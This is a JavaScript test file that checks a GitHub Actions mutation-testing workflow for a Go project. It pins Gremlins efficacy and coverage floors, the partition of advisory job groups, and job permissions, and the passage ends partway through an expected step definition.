import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

const ROOT = path.resolve(import.meta.dirname, "..");
const workflow = fs.readFileSync(
  path.join(ROOT, ".github/workflows/quality-mutation-monthly.yml"),
  "utf8",
);
const GATE = path.join(ROOT, "scripts/ci/mutation-gate.sh");

const excludedProductionDirs = new Set(["internal/banner/gen", "internal/integration"]);
// PW-6.8: the 6 mutator types Gremlins disables by default. They are measured
// by the advisory job and must stay out of the gating matrix, whose floors were
// all measured without them.
const advisoryFlags = [
  "--invert-logical",
  "--invert-bitwise",
  "--invert-bwassign",
  "--invert-assignments",
  "--invert-loopctrl",
  "--remove-self-assignments",
];
// The 5 mutators Gremlins enables by default. The gating matrix already
// measures these, so the advisory job explicitly disables all 5 rather than
// re-running them alongside the 6 above.
const defaultMutatorFlags = [
  "--arithmetic-base=false",
  "--conditionals-boundary=false",
  "--conditionals-negation=false",
  "--increment-decrement=false",
  "--invert-negatives=false",
];
// The advisory job splits the gating matrix's packages across these groups so
// each leg stays well under the runner's measured CPU-shutdown ceiling.
// scripts/mutation-config.test.mjs is the only place this partition is
// written down; the workflow's own matrix.include is checked against it.
const advisoryGroupPackages = new Map([
  ["server", ["./internal/server"]],
  ["edge", ["./internal/edge"]],
  ["generic", ["./internal/generic"]],
  [
    "misc-a",
    ["./internal/adapter", "./internal/adapter/drydock", "./internal/auth", "./internal/audit"],
  ],
  ["misc-b", ["./internal/docker", "./internal/mcp", "./internal/metrics"]],
  [
    "misc-c",
    [
      "./cmd/portwing",
      "./internal/banner",
      "./internal/config",
      "./internal/log",
      "./internal/pool",
      "./internal/protocol",
    ],
  ],
]);
// PW-6.8: the leg-wide efficacy floor for each advisory group's 6 extra
// mutators, measured in run 33901506579 (2026-09-04) and set to
// floor(measured) - 2pp of slack. See the matrix.include `floor:` field and
// the ADVISORY_GROUP_FLOORS env block above for the per-leg comments; this
// map is the single source both are checked against.
const advisoryGroupFloors = new Map([
  ["server", 93],
  ["edge", 80],
  ["generic", 81],
  ["misc-a", 92],
  ["misc-b", 92],
  ["misc-c", 90],
]);
const timeoutCoefficients = new Set(["pool", "protocol"]);
// adapter-drydock needs the coefficient in its advisory row (run 33848880338:
// 30 of 32 extra mutants TIMED OUT under the default coefficient) without
// touching the gated matrix, whose floor for adapter-drydock hasn't been
// remeasured under a coefficient yet. This set only widens the advisory-side
// check below; timeoutCoefficients above stays the gating-matrix contract.
const advisoryTimeoutCoefficients = new Set([...timeoutCoefficients, "adapter-drydock"]);
const expectedFloors = new Map([
  ["./cmd/portwing", [100, 100]],
  ["./internal/server", [77.88, 94.12]],
  ["./internal/adapter", [84.68, 93.28]],
  ["./internal/adapter/drydock", [82.5, 91.95]],
  ["./internal/audit", [88.31, 100]],
  ["./internal/auth", [88.58, 97.96]],
  ["./internal/banner", [76.92, 38.24]],
  ["./internal/config", [82.22, 100]],
  ["./internal/docker", [90.39, 78.08]],
  ["./internal/edge", [74.73, 91]],
  ["./internal/generic", [85, 100]],
  ["./internal/log", null],
  ["./internal/mcp", [79.49, 79.59]],
  ["./internal/metrics", [90, 83.04]],
  ["./internal/pool", [50, 80]],
  ["./internal/protocol", [100, 100]],
]);

function productionPackagePaths() {
  const packages = [];
  function visit(relativeDir) {
    const absoluteDir = path.join(ROOT, relativeDir);
    const entries = fs.readdirSync(absoluteDir, { withFileTypes: true });
    const hasProductionGo = entries.some(
      (entry) => entry.isFile() && entry.name.endsWith(".go") && !entry.name.endsWith("_test.go"),
    );
    if (hasProductionGo && !excludedProductionDirs.has(relativeDir)) packages.push(relativeDir);
    for (const entry of entries) {
      if (entry.isDirectory()) visit(path.join(relativeDir, entry.name));
    }
  }
  for (const root of ["cmd", "internal"]) visit(root);
  return packages.sort();
}

function matrixEntries(source) {
  const start = source.indexOf("      matrix:\n");
  const end = source.indexOf("\n    steps:", start);
  assert.notEqual(start, -1, "mutation matrix is missing");
  assert.notEqual(end, -1, "mutation steps are missing");
  return source
    .slice(start, end)
    .split("\n          - name: ")
    .slice(1)
    .map((entry) => {
      const lines = entry.split("\n");
      const fields = {};
      for (const line of lines) {
        const match = line.match(/^ {12}([a-z_]+): (.+)$/u);
        if (match) fields[match[1]] = match[2];
      }
      fields.name = lines[0];
      return fields;
    });
}

function assertMutationWorkflow(source, expectedPackages = productionPackagePaths()) {
  const entries = matrixEntries(source);
  const actualPackages = entries.map((entry) => entry.package).sort();
  const expectedPackagePaths = expectedPackages.map((packagePath) => `./${packagePath}`).sort();
  if (JSON.stringify(actualPackages) !== JSON.stringify(expectedPackagePaths)) {
    throw new Error("every real production package must appear exactly once");
  }
  for (const entry of entries) {
    const expectedName = entry.package.replace(/^\.\/(?:cmd|internal)\//u, "").replaceAll("/", "-");
    assert.equal(entry.name, expectedName);
    assert.ok(expectedFloors.has(entry.package), `unexpected mutation package ${entry.package}`);
    const expectedFloor = expectedFloors.get(entry.package);
    if (entry.zero_mutants === "true") {
      assert.equal(
        entry.name,
        "log",
        "only the measured zero-mutant package may use the exception",
      );
      assert.equal(expectedFloor, null);
      assert.equal(entry.efficacy, undefined);
      assert.equal(entry.mcover, undefined);
    } else {
      assert.notEqual(expectedFloor, null);
      for (const field of ["efficacy", "mcover"]) {
        assert.match(
          entry[field] ?? "",
          /^(?:\d+)(?:\.\d+)?$/u,
          `${entry.name} is missing ${field}`,
        );
        assert.ok(Number(entry[field]) >= 0 && Number(entry[field]) <= 100);
      }
      if (Number(entry.efficacy) !== expectedFloor[0]) {
        throw new Error(`${entry.name} efficacy floor is weakened`);
      }
      if (Number(entry.mcover) !== expectedFloor[1]) {
        throw new Error(`${entry.name} mcover floor is weakened`);
      }
    }
    if (entry.name === "metrics") assert.equal(entry.workers, "1");
    // Gremlins budgets each mutant at the coverage-gathering time times the
    // coefficient. Both of these packages measure well under a second, so the
    // default of 3 timed their mutants out and scored them 0.00/0.00 while
    // verifying nothing. See PW-6.2.
    if (timeoutCoefficients.has(entry.name) && entry.timeout_coefficient !== "40") {
      throw new Error(`${entry.name} needs its timeout coefficient`);
    }
  }

  assert.doesNotMatch(source, /^ {4}continue-on-error:/mu, "mutation failures must block the job");
  const runStep = mutationRunStep(source);
  assert.doesNotMatch(
    runStep,
    /^ {8}continue-on-error:/mu,
    "Gremlins failures must not be ignored at step level",
  );
  assert.match(
    runStep,
    /set -euo pipefail/u,
    "the report pipeline must preserve Gremlins failures",
  );
  assert.match(
    runStep,
    /^ {10}if \[ "\$\{\{ matrix\.zero_mutants \|\| false \}\}" = "true" \]; then$/mu,
    "Gremlins script must preserve the zero-mutant branch",
  );
  assert.match(
    runStep,
    /^ {12}gremlins unleash --tags="" \\\n+^ {14}"\$\{gremlins_args\[@\]\+"\$\{gremlins_args\[@\]\}"\}" \\\n+^ {14}--output mutation-report\.json \\\n+^ {14}"\$\{\{ matrix\.package \}\}" 2>&1 \| tee mutation-report\.txt$/mu,
    "Gremlins executable unleash command is malformed",
  );
  // The floors are only real because mutation-gate.sh reads the report and
  // exits non-zero. It has to be the next command in the same step, on its
  // own, so nothing can swallow its status. See PW-6.1.
  assert.match(
    runStep,
    /^ {12}\.\/scripts\/ci\/mutation-gate\.sh mutation-report\.json "\$\{\{ matrix\.efficacy \}\}" "\$\{\{ matrix\.mcover \}\}"$/mu,
    "the mutation floors must be enforced by scripts/ci/mutation-gate.sh",
  );
  // Gremlins' own threshold flags parse and then do nothing: Viper returns a
  // bound float64 pflag as a string, so report.assess() reads 0 and never
  // fires. Anything that reintroduces them is claiming a gate that is not
  // there. See the header of scripts/ci/mutation-gate.sh.
  assert.doesNotMatch(
    runStep,
    /--threshold-(?:efficacy|mcover)/u,
    "Gremlins' own threshold flags are inert and must not be trusted",
  );
  assert.doesNotMatch(
    runStep,
    /^ {10}if false; then$/mu,
    "Gremlins script must preserve the zero-mutant branch",
  );
  assert.match(runStep, /gremlins_args\+=\(--workers "\$\{\{ matrix\.workers \}\}"\)/u);
  assert.match(
    runStep,
    /gremlins_args\+=\(--timeout-coefficient "\$\{\{ matrix\.timeout_coefficient \}\}"\)/u,
  );
  assert.match(runStep, /\| tee mutation-report\.txt/u);
  assert.match(runStep, /grep -q "No results to report" mutation-report\.txt/u);
  assert.match(source, /name: Upload mutation report/u);
  assert.match(source, /^ {12}mutation-report\.txt$/mu);
  assert.match(source, /^ {12}mutation-report\.json$/mu);
  assert.match(source, /internal\/banner\/gen is generator-only/u);
  assert.match(source, /internal\/integration is integration-test-only/u);
  assertCanaryJob(source);
  assertAdvisoryJob(source, entries);
  assertAdvisorySummaryJob(source);
  assertMutationSurvivorsRecordStep(source, entries);
  assertRatchetJob(source);
}

// Comment lines are not code, the same reasoning
// scripts/quality-history-config-test.sh:52 applies to its own bash
// equivalent: a "must not contain X" assertion that reads through comments
// would fail the moment a comment mentions X in passing, such as this job's
// own header explaining why it never runs git push.
function stripComments(text) {
  return text
    .split("\n")
    .filter((line) => !/^\s*#/u.test(line))
    .join("\n");
}

// The `run: |` step bodies only, not the whole job block. Every job in this
// file pins actions with a version comment (`# v7.0.1`) and every job runs on
// `ubuntu-24.04`, both of which contain a decimal-looking substring that has
// nothing to do with a ratchet parameter. Scoping to the executable bodies is
// what makes "no floating-point literal" a check on the ratchet's own numbers
// (min gain, buffer floor, seed buffers) rather than a check that breaks on
// the runner image tag.
function runStepBodies(jobText) {
  const lines = jobText.split("\n");
  const bodies = [];
  let collecting = false;
  let bodyLines = [];
  let bodyIndent = null;
  for (const line of lines) {
    if (/^ {8}run: \|$/u.test(line)) {
      if (collecting) bodies.push(bodyLines.join("\n"));
      collecting = true;
      bodyLines = [];
      bodyIndent = null;
      continue;
    }
    if (collecting) {
      if (line.trim() === "") {
        bodyLines.push(line);
        continue;
      }
      const indentMatch = line.match(/^( +)/u);
      const indent = indentMatch ? indentMatch[1].length : 0;
      if (bodyIndent === null) bodyIndent = indent;
      if (indent < bodyIndent) {
        bodies.push(bodyLines.join("\n"));
        collecting = false;
        bodyLines = [];
        bodyIndent = null;
      } else {
        bodyLines.push(line);
      }
    }
  }
  if (collecting) bodies.push(bodyLines.join("\n"));
  return bodies.join("\n---\n");
}

// Locates a step by its exact `- name: ` line within a job's text and
// returns the step's ENTIRE block -- the `- name:` line itself through
// every key that follows it (env:, run:, if:, continue-on-error:, shell:,
// working-directory:, whatever it has) -- as an array of literal lines,
// indentation included. Pinning only the run: scalar left every OTHER key
// on the step unchecked: `if: false`, `continue-on-error: true`, or a
// `shell:` override that changes how the same script text even runs all
// pass with an identical body. The step name must occur exactly once in
// the job text first: `indexOf` finding the first match silently accepts a
// same-named decoy step placed earlier with `if: false` and the real body,
// shadowing whichever step actually runs. A YAML clipped block scalar
// (`|`, the default chomping) keeps exactly one trailing newline; the blank
// line(s) between this step and whatever text follows in the source are
// formatting, not part of any key's value, so trailing blank entries are
// trimmed.
function stepBlockLines(jobText, stepName, missingMessage) {
  const nameLine = `      - name: ${stepName}`;
  const nameLineRe = new RegExp(`^ {6}- name: ${escapeForRegExp(stepName)}$`, "gmu");
  const matches = [...jobText.matchAll(nameLineRe)];
  assert.notEqual(matches.length, 0, missingMessage);
  assert.ok(
    matches.length === 1,
    `the step named ${JSON.stringify(stepName)} must appear exactly once in the job, found ${matches.length} (a same-named decoy step can shadow the real one)`,
  );
  const stepStart = matches[0].index;
  assert.ok(jobText.slice(stepStart, stepStart + nameLine.length) === nameLine);
  const nextStepMatch = /^ {6}- name: /mu.exec(jobText.slice(stepStart + nameLine.length));
  const stepText =
    nextStepMatch === null
      ? jobText.slice(stepStart)
      : jobText.slice(stepStart, stepStart + nameLine.length + nextStepMatch.index);
  const lines = stepText.split("\n");
  while (lines.length > 0 && lines[lines.length - 1] === "") lines.pop();
  assert.ok(lines.length > 0, `${missingMessage} (empty step block)`);
  return lines;
}

// PW-5.5's split applies here too: the ratchet job reads this run's own
// records and the quality-history series and proposes; it must never hold
// write access and never execute Go, Gremlins or git's write path. Unlike
// `history`, it also has no reason to hold `contents: write`, so its own
// permissions block is asserted at exactly `contents: read` rather than just
// "no write scope".
function assertRatchetJob(source) {
  const ratchet = jobBlock(source, "ratchet", "the mutation ratchet job is missing");

  assert.match(
    ratchet,
    /^ {4}needs: \[gremlins, history\]$/mu,
    "the ratchet job must need both gremlins and history",
  );

  const permissionsMatch = ratchet.match(/^ {4}permissions:\n((?: {6}.+\n)+)/mu);
  assert.ok(permissionsMatch, "the ratchet job must declare its own permissions");
  const permissionsLines = permissionsMatch[1].split("\n").filter((line) => line.length > 0);
  assert.ok(
    permissionsLines.length === 1 && permissionsLines[0] === "      contents: read",
    "the ratchet job's permissions must be exactly contents: read",
  );

  const code = stripComments(ratchet);
  for (const forbidden of ["actions/setup-go", "gremlins unleash", "git push", "git commit"]) {
    assert.doesNotMatch(
      code,
      new RegExp(escapeForRegExp(forbidden), "u"),
      `the ratchet job must not run '${forbidden}'; it only reads`,
    );
  }

  assert.doesNotMatch(
    runStepBodies(ratchet),
    /\d+\.\d+/u,
    "the ratchet job's run steps must not hardcode a floating-point literal; ratchet parameters live in scripts/ci/mutation-ratchet.sh",
  );
}

// PW-6.8: the advisory job exists to measure the mutators the gating matrix
// deliberately leaves off. Two things have to stay true for that split to mean
// anything: the advisory job must never gate, and the gating jobs must never
// pick up the advisory mutators, because every floor in the matrix was measured
// without them.
function assertAdvisoryJob(source, entries) {
  const advisory = jobBlock(source, "mutation-advisory", "the advisory mutator job is missing");
  const runStep = mutationRunStep(source);

  assert.doesNotMatch(
    advisory,
    /mutation-gate\.sh/u,
    "the advisory job must not call the gate, or it stops being advisory",
  );
  for (const flag of advisoryFlags) {
    assert.match(
      advisory,
      new RegExp(`^ {12}${escapeForRegExp(flag)}$`, "mu"),
      `the advisory job must enable ${flag}`,
    );
    assert.doesNotMatch(
      runStep,
      new RegExp(escapeForRegExp(flag), "u"),
      `${flag} would invalidate every floor measured without it`,
    );
  }
  // The 5 default mutators are already measured by the gating matrix, so the
  // advisory job must explicitly disable every one of them rather than
  // re-running all 11: that duplication is what pushed a 4-group split over
  // the runner's CPU ceiling.
  for (const flag of defaultMutatorFlags) {
    assert.match(
      advisory,
      new RegExp(`^ {12}${escapeForRegExp(flag)}$`, "mu"),
      `the advisory job must disable ${flag}`,
    );
  }

  // Declaring advisory_flags is not the same as running with it: a version
  // that keeps the array but drops it from the unleash invocation would still
  // pass every check above while gremlins measured only the 5 default
  // mutators. The invocation must expand both arrays literally.
  assert.match(
    advisory,
    /^ {12}if ! gremlins unleash --tags="" \\\n^ {14}"\$\{advisory_flags\[@\]\}" \\\n^ {14}"\$\{default_mutator_flags\[@\]\}" \\\n^ {14}"\$\{coefficient_args\[@\]\+"\$\{coefficient_args\[@\]\}"\}" \\\n^ {14}--output "\$\{report\}" \\\n^ {14}"\$\{package\}" 2>&1 \| tee "mutation-advisory-\$\{name\}\.txt"; then$/mu,
    "the advisory job must expand advisory_flags and default_mutator_flags on the unleash invocation",
  );

  // mutationRunStep is checked for step-level continue-on-error above, but
  // that check is scoped to the gating job's own step. continue-on-error on
  // the advisory step would swallow its zero-advisory-mutants exit 1 and
  // report the job green having measured nothing, so it is banned anywhere
  // in this job, not just on one named step.
  assert.doesNotMatch(
    advisory,
    /continue-on-error:/u,
    "continue-on-error must not appear anywhere in the advisory job",
  );

  // A flag Gremlins renamed would be swallowed by the per-package guard and
  // read as an unavailable package, and a run that discovers no advisory
  // mutants at all measured nothing. Both are the PW-6.1 failure, so both have
  // to be loud.
  assert.match(
    advisory,
    /^ {10}help_text="\$\(gremlins unleash --help\)"$/mu,
    "the advisory job must check the flag names against the binary",
  );
  assert.match(
    advisory,
    /^ {10}if \[ "\$\{advisory_mutants\}" -eq 0 \]; then$/mu,
    "the advisory job must fail when the advisory mutators produce nothing",
  );

  // Gremlins v0.6.0's report.Do() exits 0 without writing the JSON file when
  // a package has zero mutants of the requested types (report.go:71-73,
  // 243-249). internal/log is exactly that case among the six advisory
  // mutators; without this branch a report-less success reads as
  // "unavailable" forever instead of "measured zero", the same distinction
  // the gating matrix's own zero_mutants convention draws for the same
  // package.
  assert.match(
    advisory,
    /^ {12}if \[ ! -f "\$\{report\}" \]; then$/mu,
    "the advisory job must treat a report-less success as zero mutants, not unavailable",
  );
  const zeroMutantsHeadlineRow = `headline_rows+=("| \\\`${advisoryPackageVar}\\\` | 0 | 0 | 0 | 0 | n/a |")`;
  const zeroMutantsMutatorRow = `mutator_rows+=("| \\\`${advisoryPackageVar}\\\` | 0 | 0 | 0 | 0 | 0 | 0 |")`;
  assert.match(
    advisory,
    new RegExp(`^ {14}${escapeForRegExp(zeroMutantsHeadlineRow)}$`, "mu"),
    "the advisory job's zero-mutants branch must record an explicit zero headline row",
  );
  assert.match(
    advisory,
    new RegExp(`^ {14}${escapeForRegExp(zeroMutantsMutatorRow)}$`, "mu"),
    "the advisory job's zero-mutants branch must record an explicit zero mutator row",
  );

  // Gremlins computes efficacy as killed/(killed+lived); NOT COVERED plays no
  // part in that ratio. A guard that also sums not_covered would let a
  // package that is all NOT COVERED (or all TIMED OUT) fall through with
  // killed+lived+not_covered > 0 and print Gremlins' 0.00 efficacy as a
  // measured value, the same bug scripts/ci/mutation-gate.sh's own guard
  // avoids by summing only killed and lived.
  assert.match(
    advisory,
    new RegExp(`^ {12}${escapeForRegExp(advisoryUnmeasuredGuard)}$`, "mu"),
    "the advisory job's unmeasured guard must sum only killed and lived, not not_covered",
  );
  assert.doesNotMatch(
    advisory,
    new RegExp(escapeForRegExp(killedPlusLivedPlusNotCovered), "u"),
    "the advisory job's unmeasured guard must not include not_covered",
  );

  // The single-job form used to publish straight to GITHUB_STEP_SUMMARY.
  // Splitting it into a matrix means each leg only has one group's worth of
  // rows, so the combined table has to move to mutation-advisory-summary; a
  // leg publishing its own partial table would be four incomplete summaries
  // instead of one.
  assert.doesNotMatch(
    advisory,
    /GITHUB_STEP_SUMMARY/u,
    "each advisory leg must hand its rows to mutation-advisory-summary, not publish a partial table itself",
  );
  assert.match(
    advisory,
    /^ {10}printf '%s\\n' "\$\{headline_rows\[@\]\}" >mutation-advisory-headline\.txt$/mu,
    "the advisory job must write its headline rows for the summary job to collect",
  );
  assert.match(
    advisory,
    /^ {10}printf '%s\\n' "\$\{mutator_rows\[@\]\}" >mutation-advisory-mutators\.txt$/mu,
    "the advisory job must write its mutator rows for the summary job to collect",
  );
  assert.match(
    advisory,
    /^ {10}name: mutation-advisory-\$\{\{ matrix\.group \}\}-\$\{\{ github\.run_id \}\}$/mu,
    "each advisory leg must upload its rows under a group-scoped artifact name",
  );

  assertAdvisoryMatrix(advisory, entries);
}

// The matrix that replaced the single job. Every package the gating matrix
// above measures has to land in exactly one group here, with the same floor
// (or the same blank floor, for a zero_mutants package), or the advisory
// table silently stops covering a package the gating matrix still enforces.
function assertAdvisoryMatrix(advisory, entries) {
  const strategyStart = advisory.indexOf("    strategy:\n");
  const stepsStart = advisory.indexOf("\n    steps:", strategyStart);
  assert.notEqual(strategyStart, -1, "the advisory job must be a matrix of package groups");
  assert.notEqual(stepsStart, -1, "the advisory job's matrix block has no steps boundary");
  const strategy = advisory.slice(strategyStart, stepsStart);

  assert.match(
    strategy,
    /^ {6}fail-fast: false$/mu,
    "the advisory matrix must set fail-fast: false so one group's failure does not hide the rest",
  );
  assert.match(
    strategy,
    /^ {6}matrix:\n {8}include:$/mu,
    "the advisory job must declare a matrix.include list of groups",
  );

  const groupBlocks = strategy.split(/\n {10}- group: /u).slice(1);
  assert.ok(groupBlocks.length > 0, "the advisory matrix must declare at least one group");

  const seenPackages = new Map();
  const groupsFound = new Map();

  for (const block of groupBlocks) {
    const groupName = block.split("\n")[0];
    const marker = "            packages: |\n";
    const packagesStart = block.indexOf(marker);
    assert.notEqual(packagesStart, -1, `advisory group ${groupName} must declare packages: |`);

    // PW-6.8: the leg-wide floor for this group's 6 extra mutators, measured
    // in run 33901506579. It lives in the preamble between the group name
    // and its packages: | marker, alongside whatever comments explain it.
    const preamble = block.slice(0, packagesStart);
    const floorMatch = preamble.match(/^ {12}floor: (\d+)$/mu);
    assert.ok(floorMatch, `${groupName} is missing its advisory floor`);
    const expectedGroupFloor = advisoryGroupFloors.get(groupName);
    assert.ok(expectedGroupFloor !== undefined, `unexpected advisory group ${groupName}`);
    if (Number(floorMatch[1]) !== expectedGroupFloor) {
      throw new Error(`${groupName} advisory floor is weakened`);
    }

    const rest = block.slice(packagesStart + marker.length);

    const packageLines = [];
    for (const line of rest.split("\n")) {
      if (line === "") break;
      assert.ok(
        line.startsWith("              "),
        `advisory group ${groupName} has a malformed package line: ${line}`,
      );
      packageLines.push(line.slice("              ".length));
    }
    assert.ok(packageLines.length > 0, `advisory group ${groupName} lists no packages`);

    const packages = packageLines.map((line) => {
      const parts = line.split("|");
      if (parts.length !== 3 && parts.length !== 4) {
        throw new Error(`advisory group ${groupName} has a malformed entry: ${line}`);
      }
      const [packagePath, name, floor, coefficient = ""] = parts;
      return { packagePath, name, floor, coefficient };
    });
    groupsFound.set(groupName, packages);

    for (const { packagePath, name, floor, coefficient } of packages) {
      if (seenPackages.has(packagePath)) {
        throw new Error(
          `${packagePath} appears in both '${seenPackages.get(packagePath)}' and '${groupName}'`,
        );
      }
      seenPackages.set(packagePath, groupName);

      const entry = entries.find((candidate) => candidate.package === packagePath);
      assert.ok(
        entry,
        `${packagePath} is in advisory group '${groupName}' but not in the gating matrix`,
      );
      if (name !== entry.name) {
        throw new Error(`${packagePath}'s advisory row must use the gating matrix's name`);
      }
      if (entry.zero_mutants === "true") {
        if (floor !== "") {
          throw new Error(
            `${entry.name} has no gating floor and its advisory row must leave one blank`,
          );
        }
      } else if (floor !== entry.efficacy) {
        throw new Error(
          `${entry.name}'s advisory row must carry the efficacy floor the matrix measured`,
        );
      }

      // A package in advisoryTimeoutCoefficients needs the same coefficient
      // in its advisory row: without it the advisory leg re-creates the
      // all-TIMED OUT run that scored 0.00% and read as a real measurement.
      // adapter-drydock is advisory-only here (the gated row has no
      // coefficient), so this checks the advisory group's own row, not the
      // gating matrix.
      const expectedCoefficient = advisoryTimeoutCoefficients.has(name) ? "40" : "";
      if (coefficient !== expectedCoefficient) {
        throw new Error(
          `${name}'s advisory row must carry the timeout coefficient the advisory group requires`,
        );
      }
    }
  }

  const gatedPackages = entries.map((entry) => entry.package).sort();
  const advisoryPackagesFound = [...seenPackages.keys()].sort();
  if (JSON.stringify(gatedPackages) !== JSON.stringify(advisoryPackagesFound)) {
    throw new Error("every package in the gating matrix must appear in exactly one advisory group");
  }

  // The specific partition, not just full coverage: server, edge and generic
  // each sized enough (~9, ~5, ~6 gated minutes) to run alone, and the rest
  // spread across two more groups. A future rebalance is fine as long as it
  // is deliberate; this catches a group silently losing or gaining a package.
  const expectedGroupNames = [...advisoryGroupPackages.keys()].sort();
  const actualGroupNames = [...groupsFound.keys()].sort();
  if (JSON.stringify(expectedGroupNames) !== JSON.stringify(actualGroupNames)) {
    throw new Error("the advisory matrix's groups no longer match the documented partition");
  }
  for (const [groupName, expectedPackages] of advisoryGroupPackages) {
    const actualPackages = groupsFound
      .get(groupName)
      .map((entry) => entry.packagePath)
      .sort();
    if (JSON.stringify([...expectedPackages].sort()) !== JSON.stringify(actualPackages)) {
      throw new Error(
        `advisory group '${groupName}' no longer matches its documented package list`,
      );
    }
  }
}

// The single job this used to be would silently swallow the runner's
// shutdown signal by taking the whole advisory measurement down with it.
// This job is deliberately separate, deliberately without setup-go or
// Gremlins, and deliberately read-only: it only assembles rows the matrix
// legs already computed.
function assertAdvisorySummaryJob(source) {
  const summary = jobBlock(
    source,
    "mutation-advisory-summary",
    "the advisory summary job is missing",
  );

  assert.match(
    summary,
    /^ {4}needs: mutation-advisory$/mu,
    "the advisory summary job must need mutation-advisory",
  );
  assert.match(
    summary,
    /^ {4}if: always\(\)$/mu,
    "the advisory summary job must run even if a leg failed",
  );

  const permissionsMatch = summary.match(/^ {4}permissions:\n((?: {6}.+\n)+)/mu);
  assert.ok(permissionsMatch, "the advisory summary job must declare its own permissions");
  const permissionsLines = permissionsMatch[1].split("\n").filter((line) => line.length > 0);
  assert.ok(
    permissionsLines.length === 1 && permissionsLines[0] === "      contents: read",
    "the advisory summary job's permissions must be exactly contents: read",
  );

  const code = stripComments(summary);
  for (const forbidden of [
    "actions/setup-go",
    "gremlins unleash",
    "gremlins install",
    "go install",
  ]) {
    assert.doesNotMatch(
      code,
      new RegExp(escapeForRegExp(forbidden), "u"),
      `the advisory summary job must not run '${forbidden}'; it only assembles rows the legs already computed`,
    );
  }

  assert.match(
    summary,
    /^ {10}pattern: mutation-advisory-\*-\$\{\{ github\.run_id \}\}$/mu,
    "the advisory summary job must download every leg's rows artifact",
  );
  assert.match(
    summary,
    /GITHUB_STEP_SUMMARY/u,
    "the advisory summary job must publish the combined table",
  );

  // `cat rows/*/... || true` is silent about a group whose leg was killed
  // before it could upload (PW-6.8's own comment on the matrix above
  // documents the runner's CPU-shutdown signal doing exactly that), so the
  // table would render as complete with one group's packages simply absent.
  // This job's own env has to carry every group and package the advisory
  // matrix declares, duplicated rather than read from the matrix's context
  // because this job runs after it and has none, and it has to match
  // advisoryGroupPackages above exactly or a renamed or dropped group here
  // would go unnoticed by both this check and the summary it renders.
  const envMatch = summary.match(/^ {10}ADVISORY_GROUP_PACKAGES: \|\n((?: {12}.+\n)+)/mu);
  assert.ok(envMatch, "the advisory summary job must declare ADVISORY_GROUP_PACKAGES");
  const declaredPairs = envMatch[1]
    .split("\n")
    .filter((line) => line.length > 0)
    .map((line) => line.slice("            ".length));
  const expectedPairs = [];
  for (const [group, packages] of advisoryGroupPackages) {
    for (const pkg of packages) {
      expectedPairs.push(`${group}|${pkg}`);
    }
  }
  if (JSON.stringify(declaredPairs) !== JSON.stringify(expectedPairs)) {
    throw new Error(
      "the advisory summary job's ADVISORY_GROUP_PACKAGES must match the advisory matrix's own groups and packages exactly",
    );
  }

  // PW-6.8: ADVISORY_GROUP_FLOORS mirrors the matrix.include `floor:` field
  // the same way ADVISORY_GROUP_PACKAGES mirrors its packages, and for the
  // same reason: this job runs after the matrix and has no context left to
  // read it from.
  const floorsEnvMatch = summary.match(/^ {10}ADVISORY_GROUP_FLOORS: \|\n((?: {12}.+\n)+)/mu);
  assert.ok(floorsEnvMatch, "the advisory summary job must declare ADVISORY_GROUP_FLOORS");
  const declaredFloorPairs = floorsEnvMatch[1]
    .split("\n")
    .filter((line) => line.length > 0)
    .map((line) => line.slice("            ".length));
  const expectedFloorPairs = [...advisoryGroupFloors].map(([group, floor]) => `${group}|${floor}`);
  if (JSON.stringify(declaredFloorPairs) !== JSON.stringify(expectedFloorPairs)) {
    throw new Error(
      "the advisory summary job's ADVISORY_GROUP_FLOORS must match the advisory matrix's own floors exactly",
    );
  }

  // The sums this job compares against ADVISORY_GROUP_FLOORS come from rows
  // the legs already wrote; this job must never re-measure, and a miss must
  // warn rather than fail (the mutation-gate.sh pattern is for the gating
  // job, not this one).
  assert.doesNotMatch(
    summary,
    /mutation-gate\.sh/u,
    "the advisory summary job must not call the gate, or it stops being advisory",
  );
  assert.match(
    summary,
    /::warning::advisory group \$\{group\} measured \$\{efficacy\}% efficacy on the 6 extra mutators, below its floor of \$\{floor\}%/u,
    "the advisory summary job must warn when a leg's efficacy is below its measured floor",
  );

  assert.match(
    summary,
    /^ {10}if \[ "\$\{#missing_groups\[@\]\}" -gt 0 \]; then$/mu,
    "the advisory summary job must fail when a group's leg never uploaded",
  );
  assert.match(
    summary,
    /^ {12}exit 1$/mu,
    "the advisory summary job must exit non-zero when a group is missing",
  );

  // The `mutation-gate.sh` check above catches a re-measure-and-gate rewrite,
  // but pinning only the run: scalar leaves every OTHER key on the step
  // unchecked: `if: false`, `continue-on-error: true`, or a `shell:`
  // override all pass with an identical, correct-looking body, since none
  // of them touch the text this test used to compare. Pin the step's
  // ENTIRE block instead -- the `- name:` line through env:, run:, and
  // anything else it carries -- so an added or changed key anywhere on the
  // step fails the same way a rewritten script line does.
  const expectedSummaryStepLines = [
    "      - name: Combine and publish the advisory table",
    "        env:",
    "          # One line per package in the mutation-advisory matrix above,",
    "          # group|package, so a leg that produced no artifact still gets an",
    "          # explicit row instead of silently vanishing from the table.",
    "          # scripts/mutation-config.test.mjs cross-checks this list against",
    "          # that matrix's own groups and packages.",
    "          ADVISORY_GROUP_PACKAGES: |",
    "            server|./internal/server",
    "            edge|./internal/edge",
    "            generic|./internal/generic",
    "            misc-a|./internal/adapter",
    "            misc-a|./internal/adapter/drydock",
    "            misc-a|./internal/auth",
    "            misc-a|./internal/audit",
    "            misc-b|./internal/docker",
    "            misc-b|./internal/mcp",
    "            misc-b|./internal/metrics",
    "            misc-c|./cmd/portwing",
    "            misc-c|./internal/banner",
    "            misc-c|./internal/config",
    "            misc-c|./internal/log",
    "            misc-c|./internal/pool",
    "            misc-c|./internal/protocol",
    "          # PW-6.8: one line per advisory leg, group|floor, mirroring the",
    "          # matrix.include `floor:` field above. Duplicated for the same",
    "          # reason ADVISORY_GROUP_PACKAGES is: this job runs after the",
    "          # matrix and has no context left to read it from.",
    "          # scripts/mutation-config.test.mjs cross-checks this against the",
    "          # advisory matrix's own floors.",
    "          ADVISORY_GROUP_FLOORS: |",
    "            server|93",
    "            edge|80",
    "            generic|81",
    "            misc-a|92",
    "            misc-b|92",
    "            misc-c|90",
    "        run: |",
    "          set -euo pipefail",
    "",
    "          # A leg killed before it could upload (the runner's CPU shutdown",
    "          # signal, PW-6.8's own comment above) leaves no rows file for its",
    "          # group, and `cat ... || true` below would read that silently: the",
    "          # summary renders as complete with one group just missing. Every",
    "          # expected group is checked here, and each package in a missing",
    "          # group gets an explicit row instead of vanishing.",
